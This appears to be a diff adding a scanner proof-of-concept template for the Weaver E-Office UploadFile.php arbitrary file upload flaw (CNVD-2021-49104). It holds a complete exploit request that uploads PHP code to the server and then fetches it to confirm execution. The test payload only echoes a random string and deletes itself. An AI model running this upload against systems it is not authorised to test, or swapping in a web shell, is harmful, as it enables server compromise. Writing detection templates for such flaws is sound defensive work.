@@ -1,0 +1,35 @@
+id: poc-yaml-e-office-v9-upload-cnvd-2021-49104
+info:
+  name: 泛微E-Office UploadFile.php 文件上传漏洞
+  severity: critical
+  tags:
+  - CNVD-2021-49104
+  - 两高一弱
+  finger: e-office
+  reference: []
+  description: null
+variables:
+  r1: random_str(8)
+transport: http
+requests:
+- method: POST
+  path: /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=
+  headers:
+    Content-Type: multipart/form-data;boundary=e64bdf16c554bbc109cecef6451c26a4
+  data: "--e64bdf16c554bbc109cecef6451c26a4\r\nContent-Disposition: form-data; name=\"\
+    Filedata\"; filename=\"test.jsp\"\r\nContent-Type: application/octet-stream\r\n\
+    \r\n<?php echo \"{{.r1}}\"; unlink(__FILE__); ?>\r\n--e64bdf16c554bbc109cecef6451c26a4--"
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "logo-eoffice")
+  output: []
+- method: GET
+  path: /images/logo/logo-eoffice.php
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, r1)
+  output: []
